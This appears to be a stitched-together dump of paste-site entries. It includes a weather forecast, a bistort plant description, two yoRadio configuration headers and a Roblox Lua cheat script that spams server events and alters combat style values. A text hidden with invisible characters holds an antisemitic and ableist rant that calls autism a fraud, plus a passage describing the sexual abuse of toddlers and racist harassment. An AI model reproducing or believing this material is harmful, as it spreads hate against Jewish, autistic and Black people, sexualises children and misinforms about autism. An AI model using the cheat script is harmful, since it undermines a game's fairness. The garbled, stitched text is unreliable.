M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎.‎ ‎H‎i‎g‎h‎ ‎7‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
7‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎4‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎2‎ ‎p‎m‎
T‎u‎e‎ ‎2‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎4‎°‎
1‎8‎%‎
S‎
1‎1‎
 ‎
m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎4‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
9‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
8‎:‎0‎3‎ ‎p‎m‎
F‎u‎l‎l‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
6‎:‎3‎6‎ ‎a‎m‎
W‎e‎d‎ ‎2‎4‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎5‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎7‎1‎°‎
3‎6‎%‎
S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎7‎1‎°‎
4‎8‎%‎
S‎ ‎1‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎7‎°‎
/‎7‎2‎°‎
2‎1‎%‎
S‎S‎E‎ ‎2‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎8‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎7‎0‎°‎
4‎7‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎9‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎8‎°‎
5‎9‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎3‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎9‎°‎
4‎1‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎1‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎7‎0‎°‎
3‎9‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎7‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎9‎°‎
3‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎5‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎6‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎8‎°‎
3‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎B‎r‎i‎t‎f‎a‎g‎s‎.‎ ‎🧐

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎s‎p‎e‎r‎g‎e‎r‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎
A‎s‎s‎ ‎B‎u‎r‎g‎e‎r‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎i‎s‎ ‎a‎ ‎t‎e‎r‎m‎ ‎t‎h‎a‎t‎ ‎g‎r‎e‎w‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎i‎l‎d‎ ‎a‎n‎d‎ ‎c‎o‎m‎p‎e‎t‎i‎t‎i‎v‎e‎ ‎""‎P‎u‎b‎l‎i‎s‎h‎ ‎o‎r‎ ‎P‎e‎r‎i‎s‎h‎""‎ ‎m‎e‎d‎i‎c‎a‎l‎ ‎r‎e‎s‎e‎a‎r‎c‎h‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎.‎ ‎A‎ ‎c‎e‎r‎t‎a‎i‎n‎ ‎k‎i‎k‎e‎ ‎n‎a‎m‎e‎d‎ ‎D‎r‎.‎ ‎H‎a‎n‎s‎ ‎A‎s‎p‎e‎r‎g‎e‎r‎,‎ ‎d‎u‎e‎ ‎t‎o‎ ‎h‎i‎s‎ ‎J‎e‎w‎ ‎i‎n‎s‎t‎i‎n‎c‎t‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎u‎p‎ ‎n‎o‎n‎e‎x‎i‎s‎t‎e‎n‎t‎ ‎d‎i‎s‎e‎a‎s‎e‎s‎ ‎t‎o‎ ‎s‎c‎a‎m‎ ‎o‎t‎h‎e‎r‎w‎i‎s‎e‎ ‎n‎o‎r‎m‎a‎l‎ ‎p‎e‎o‎p‎l‎e‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎m‎o‎n‎e‎y‎,‎ ‎h‎a‎d‎ ‎t‎h‎e‎ ‎b‎r‎i‎l‎l‎i‎a‎n‎t‎ ‎i‎d‎e‎a‎ ‎o‎f‎ ‎p‎u‎t‎t‎i‎n‎g‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎p‎s‎y‎c‎h‎o‎p‎a‎t‎h‎s‎ ‎w‎i‎t‎h‎ ‎l‎i‎t‎t‎l‎e‎ ‎o‎r‎ ‎n‎o‎ ‎s‎o‎c‎i‎a‎l‎ ‎s‎k‎i‎l‎l‎s‎ ‎i‎n‎ ‎o‎n‎e‎ ‎g‎r‎o‎u‎p‎ ‎a‎n‎d‎ ‎d‎i‎a‎g‎n‎o‎s‎e‎d‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎a‎ ‎n‎e‎w‎ ‎m‎e‎n‎t‎a‎l‎ ‎i‎l‎l‎n‎e‎s‎s‎:‎ ‎A‎U‎T‎I‎S‎M‎.‎ ‎(‎T‎h‎e‎ ‎n‎a‎m‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎i‎s‎ ‎a‎ ‎e‎u‎p‎h‎e‎m‎i‎s‎m‎ ‎f‎o‎r‎ ‎w‎h‎a‎t‎ ‎h‎e‎ ‎c‎a‎l‎l‎e‎d‎ ‎""‎A‎u‎t‎i‎s‎t‎i‎c‎ ‎S‎o‎c‎i‎o‎p‎a‎t‎h‎s‎""‎)‎.‎ ‎L‎i‎k‎e‎ ‎a‎l‎l‎ ‎m‎e‎n‎t‎a‎l‎ ‎i‎l‎l‎n‎e‎s‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎b‎s‎o‎l‎u‎t‎e‎l‎y‎ ‎n‎o‎ ‎p‎h‎y‎s‎i‎c‎a‎l‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎b‎u‎t‎ ‎f‎o‎r‎ ‎e‎x‎p‎e‎c‎t‎i‎n‎g‎ ‎p‎a‎r‎e‎n‎t‎s‎ ‎i‎t‎ ‎r‎e‎p‎l‎a‎c‎e‎s‎ ‎D‎o‎w‎n‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎a‎s‎ ‎t‎h‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎n‎e‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎ ‎t‎h‎e‎y‎ ‎f‎e‎a‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎h‎i‎l‎d‎ ‎w‎i‎l‎l‎ ‎d‎e‎v‎e‎l‎o‎p‎.‎ ‎I‎t‎ ‎d‎i‎f‎f‎e‎r‎s‎ ‎f‎r‎o‎m‎ ‎H‎i‎g‎h‎ ‎F‎u‎n‎c‎t‎i‎o‎n‎i‎n‎g‎ ‎A‎u‎t‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎e‎d‎ ‎u‎t‎t‎e‎r‎ ‎b‎u‎l‎l‎s‎h‎i‎t‎ ‎b‎e‎f‎o‎r‎e‎ ‎i‎t‎ ‎w‎a‎s‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎t‎o‎ ‎i‎n‎v‎e‎n‎t‎ ‎p‎s‎y‎c‎h‎i‎a‎t‎r‎i‎c‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎s‎.‎

A‎s‎p‎e‎r‎g‎e‎r‎-‎m‎o‎n‎s‎t‎e‎r‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎s‎e‎l‎f‎-‎c‎e‎n‎t‎e‎r‎e‎d‎,‎ ‎s‎e‎l‎f‎i‎s‎h‎ ‎p‎i‎e‎c‎e‎s‎ ‎o‎f‎ ‎s‎h‎i‎t‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎e‎t‎.‎ ‎D‎e‎v‎o‎i‎d‎ ‎o‎f‎ ‎e‎m‎p‎a‎t‎h‎y‎,‎ ‎s‎o‎c‎i‎a‎l‎ ‎r‎e‎a‎s‎o‎n‎i‎n‎g‎,‎ ‎s‎o‎c‎i‎a‎l‎ ‎c‎o‎n‎t‎e‎x‎t‎,‎ ‎o‎r‎ ‎s‎e‎l‎f‎-‎a‎w‎a‎r‎e‎n‎e‎s‎s‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎s‎o‎c‎i‎o‎p‎a‎t‎h‎s‎ ‎w‎i‎t‎h‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎d‎e‎f‎i‎n‎i‎t‎i‎o‎n‎,‎ ‎w‎h‎o‎ ‎l‎i‎v‎e‎ ‎t‎o‎ ‎c‎o‎l‎l‎e‎c‎t‎ ‎a‎n‎d‎ ‎c‎a‎t‎a‎l‎o‎g‎ ‎m‎e‎a‎n‎i‎n‎g‎l‎e‎s‎s‎ ‎i‎t‎e‎m‎s‎ ‎l‎i‎k‎e‎ ‎b‎a‎r‎c‎o‎d‎e‎s‎,‎ ‎b‎o‎t‎t‎l‎e‎t‎o‎p‎s‎,‎ ‎a‎n‎d‎ ‎p‎l‎a‎s‎t‎i‎c‎ ‎c‎r‎a‎p‎ ‎b‎y‎ ‎a‎n‎y‎ ‎m‎e‎a‎n‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎m‎u‎r‎d‎e‎r‎.‎ ‎C‎o‎m‎m‎o‎n‎ ‎s‎y‎m‎p‎t‎o‎m‎s‎ ‎o‎f‎ ‎A‎s‎p‎e‎r‎g‎e‎r‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎i‎n‎c‎l‎u‎d‎e‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎s‎o‎c‎i‎a‎l‎ ‎i‎n‎t‎e‎r‎a‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎e‎m‎p‎a‎t‎h‎y‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎c‎o‎m‎m‎u‎n‎i‎c‎a‎t‎i‎o‎n‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎a‎ ‎j‎o‎b‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎l‎i‎f‎e‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎h‎y‎g‎i‎e‎n‎e‎,‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎a‎n‎i‎m‎u‎ ‎o‎r‎ ‎v‎i‎d‎e‎o‎ ‎g‎a‎m‎e‎s‎,‎ ‎a‎n‎d‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎ ‎o‎u‎t‎ ‎i‎n‎t‎o‎ ‎f‎i‎t‎s‎ ‎o‎f‎ ‎S‎t‎r‎e‎s‎s‎™‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎i‎r‎ ‎s‎t‎r‎i‎c‎t‎ ‎r‎o‎u‎t‎i‎n‎e‎s‎ ‎a‎r‎e‎ ‎b‎r‎o‎k‎e‎n‎ ‎o‎r‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎a‎s‎k‎e‎d‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎b‎e‎i‎n‎g‎ ‎l‎a‎z‎y‎,‎ ‎s‎e‎l‎f‎-‎s‎e‎r‎v‎i‎n‎g‎ ‎l‎e‎e‎c‎h‎e‎s‎ ‎l‎i‎v‎i‎n‎g‎ ‎o‎f‎f‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎i‎r‎ ‎p‎a‎r‎e‎n‎t‎s‎.‎


(‎(‎ ‎E‎D‎'‎S‎ ‎M‎O‎N‎T‎H‎ ‎O‎F‎ ‎A‎U‎T‎I‎S‎M‎ ‎C‎E‎L‎E‎B‎R‎A‎T‎I‎O‎N‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎i‎s‎t‎o‎r‎t‎a‎ ‎o‎f‎f‎i‎c‎i‎n‎a‎l‎i‎s‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎c‎o‎m‎m‎o‎n‎ ‎b‎i‎s‎t‎o‎r‎t‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎f‎l‎o‎w‎e‎r‎i‎n‎g‎ ‎p‎l‎a‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎d‎o‎c‎k‎ ‎f‎a‎m‎i‎l‎y‎ ‎P‎o‎l‎y‎g‎o‎n‎a‎c‎e‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎E‎u‎r‎o‎p‎e‎ ‎a‎n‎d‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎ ‎a‎n‎d‎ ‎w‎e‎s‎t‎e‎r‎n‎ ‎A‎s‎i‎a‎,‎ ‎b‎u‎t‎ ‎h‎a‎s‎ ‎a‎l‎s‎o‎ ‎b‎e‎e‎n‎ ‎c‎u‎l‎t‎i‎v‎a‎t‎e‎d‎ ‎a‎n‎d‎ ‎b‎e‎c‎o‎m‎e‎ ‎n‎a‎t‎u‎r‎a‎l‎i‎z‎e‎d‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎f‎o‎u‎n‎d‎ ‎g‎r‎o‎w‎i‎n‎g‎ ‎i‎n‎ ‎m‎o‎i‎s‎t‎ ‎m‎e‎a‎d‎o‎w‎s‎,‎ ‎n‎u‎t‎r‎i‎e‎n‎t‎-‎r‎i‎c‎h‎ ‎w‎o‎o‎d‎e‎d‎ ‎s‎w‎a‎m‎p‎s‎,‎ ‎f‎o‎r‎e‎s‎t‎ ‎e‎d‎g‎e‎s‎,‎ ‎w‎e‎t‎l‎a‎n‎d‎s‎,‎ ‎p‎a‎r‎k‎s‎,‎ ‎g‎a‎r‎d‎e‎n‎s‎ ‎a‎n‎d‎ ‎d‎i‎s‎t‎u‎r‎b‎e‎d‎ ‎g‎r‎o‎u‎n‎d‎.‎ ‎A‎ ‎h‎e‎r‎b‎a‎c‎e‎o‎u‎s‎ ‎p‎e‎r‎e‎n‎n‎i‎a‎l‎,‎ ‎i‎t‎ ‎g‎r‎o‎w‎s‎ ‎t‎o‎ ‎a‎ ‎h‎e‎i‎g‎h‎t‎ ‎o‎f‎ ‎2‎0‎ ‎t‎o‎ ‎8‎0‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎8‎ ‎t‎o‎ ‎3‎1‎ ‎i‎n‎c‎h‎e‎s‎)‎.‎ ‎I‎t‎ ‎b‎l‎o‎o‎m‎s‎ ‎f‎r‎o‎m‎ ‎l‎a‎t‎e‎ ‎s‎p‎r‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎a‎u‎t‎u‎m‎n‎,‎ ‎p‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎t‎a‎l‎l‎,‎ ‎e‎r‎e‎c‎t‎,‎ ‎u‎n‎b‎r‎a‎n‎c‎h‎e‎d‎ ‎a‎n‎d‎ ‎h‎a‎i‎r‎l‎e‎s‎s‎ ‎s‎t‎e‎m‎s‎ ‎e‎n‎d‎i‎n‎g‎ ‎i‎n‎ ‎s‎i‎n‎g‎l‎e‎ ‎t‎e‎r‎m‎i‎n‎a‎l‎ ‎r‎a‎c‎e‎m‎e‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎c‎l‎u‎b‎-‎l‎i‎k‎e‎ ‎s‎p‎i‎k‎e‎s‎,‎ ‎5‎ ‎t‎o‎ ‎7‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎2‎ ‎t‎o‎ ‎3‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎l‎o‎n‎g‎,‎ ‎o‎f‎ ‎r‎o‎s‎e‎-‎p‎i‎n‎k‎ ‎f‎l‎o‎w‎e‎r‎s‎.‎ ‎T‎h‎i‎s‎ ‎B‎.‎ ‎o‎f‎f‎i‎c‎i‎n‎a‎l‎i‎s‎ ‎i‎n‎f‎l‎o‎r‎e‎s‎c‎e‎n‎c‎e‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎A‎u‎s‎t‎r‎i‎a‎n‎ ‎A‎l‎p‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎U‎o‎a‎e‎i‎1‎

.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎l‎l‎o‎ ‎I‎ ‎a‎m‎ ‎N‎o‎o‎z‎e‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎.‎ ‎I‎ ‎l‎i‎k‎e‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎p‎o‎o‎p‎i‎n‎g‎ ‎o‎n‎ ‎m‎y‎ ‎d‎i‎c‎k‎.‎ ‎D‎a‎m‎n‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎a‎r‎e‎ ‎s‎o‎ ‎s‎e‎x‎y‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎o‎n‎c‎e‎ ‎I‎ ‎d‎o‎ ‎t‎h‎a‎t‎,‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎y‎e‎l‎l‎ ‎a‎t‎ ‎s‎o‎m‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎,‎ ‎a‎n‎d‎ ‎t‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎r‎e‎t‎u‎r‎n‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎c‎o‎u‎n‎t‎r‎y‎.‎"
VE9KpQT6,mytheme.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:43:33 AM CDT,"// File created with YoRadio Theme Editor created by András Daradics
// File last modified: 4/19/2024 12:20:37 AM
// GitHub: https://github.com/andrasdaradici/YoRadio-Theme-Editor
// Itch.io: https://andrasdaradici.itch.io/yoradio-theme-editor
#ifndef _my_theme_h
#define _my_theme_h

#define ENABLE_THEME
#ifdef  ENABLE_THEME

#define COLOR_BACKGROUND     0,  0,  0
#define COLOR_STATION_NAME     255,  255,  255
#define COLOR_STATION_BG    0,  0,  255
#define COLOR_STATION_FILL    0,  0,  255
#define COLOR_SNG_TITLE_1    255,  255,  0
#define COLOR_SNG_TITLE_2    255,  55,  170
#define COLOR_WEATHER    0,  255,  243
#define COLOR_VU_MAX    255,  93,  0
#define COLOR_VU_MIN    0,  255,  56
#define COLOR_CLOCK    255,  255,  255
#define COLOR_CLOCK_BG    20,  20,  20
#define COLOR_SECONDS    255,  0,  255
#define COLOR_DAY_OF_W    0,  91,  255
#define COLOR_DATE    0,  255,  0
#define COLOR_BUFFER    0,  95,  255
#define COLOR_IP    41,  189,  207
#define COLOR_VOLUME_VALUE    165,  162,  132
#define COLOR_RSSI    255,  148,  156
#define COLOR_VOLBAR_OUT    198,  237,  0
#define COLOR_VOLBAR_IN    0,  52,  255
#define COLOR_DIGITS    100, 100, 255
#define COLOR_DIVIDER    255,  255,  255
#define COLOR_BITRATE    255,  255,  255
#define COLOR_HEAP    255, 168, 162
#define COLOR_PL_CURRENT    0, 0, 0
#define COLOR_PL_CURRENT_BG    91, 118, 255
#define COLOR_PL_CURRENT_FILL    91, 118, 255
#define COLOR_PLAYLIST_0    255, 0, 0
#define COLOR_PLAYLIST_1    0, 255, 0
#define COLOR_PLAYLIST_2    255, 0, 255
#define COLOR_PLAYLIST_3    0, 0, 255
#define COLOR_PLAYLIST_4    0, 255, 255


#endif
#endif
"
Lcb0k4rY,myoptions.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:39:36 AM CDT,"#ifndef myoptions_h
#define myoptions_h

/* https://www.youtube.com/@LeventeDaradici/videos
/* https://youtu.be/48McDlKZ_2c

/* Generated by myoptions.h generator - v0.8.1 */
/* https://e2002.github.io/docs/myoptions-generator.html?r=71,2,14,41,43&i=1,2,3,4,15,16,17&v=4,5,-1,255,27,26,25 */
/* Put this file next to yoRadio.ino and restart Arduino IDE. */

/* !!! Attention !!! */
/* This configuration depends on some additional libraries. Please install them using the library manager: */
/* Adafruit GFX Library, Adafruit ST7735 and ST7789 Library */

/* !!! Do not be alarmed, all right, the default values ​​are not included in this file !!! */

#define DSP_MODEL			DSP_ST7789

#define IR_PIN                15
#define IR_TIMEOUT            80    

#endif
"
6L4rvKc9,Legend style,Dsaqwed123,LScript,Tuesday 23rd of April 2024 08:05:51 AM CDT,"local sound = Instance.new(""Sound"")
sound.SoundId = ""rbxassetid://9426968107"" -- 9426968107
sound.Looped = true
sound.Parent = workspace
sound.Volume = 0.6
sound:Play()
getfenv().Activated = true

local function FillHeat()
    local Event = game:GetService(""ReplicatedStorage"").Events.ME

    for i=1,6 do
        local A_1 =  {
            [1] = ""heat"", 
            [2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
        }
        Event:FireServer(A_1)
    end
end

spawn(function()
    while true do
        task.wait()
        if not Activated then break end
        FillHeat()
    end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface
local bt = interf.Battle
local main = bt.Main

local menu = pgui.MenuUI.Menu 
local abil = menu.Abilities.Frame.Frame.Frame
                                              
if game.ReplicatedStorage.Styles:FindFirstChild(""Brawler"") then
v = game.ReplicatedStorage.Styles[""Brawler""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end                          
v.Name = ""Brawler""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingShotgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingShotgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperShotgun'
v.Name = ""H_GunStandingShotgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Brawler[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 1.9
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Brawler[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = Color3.fromRGB(241, 240, 234)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenFinisher'
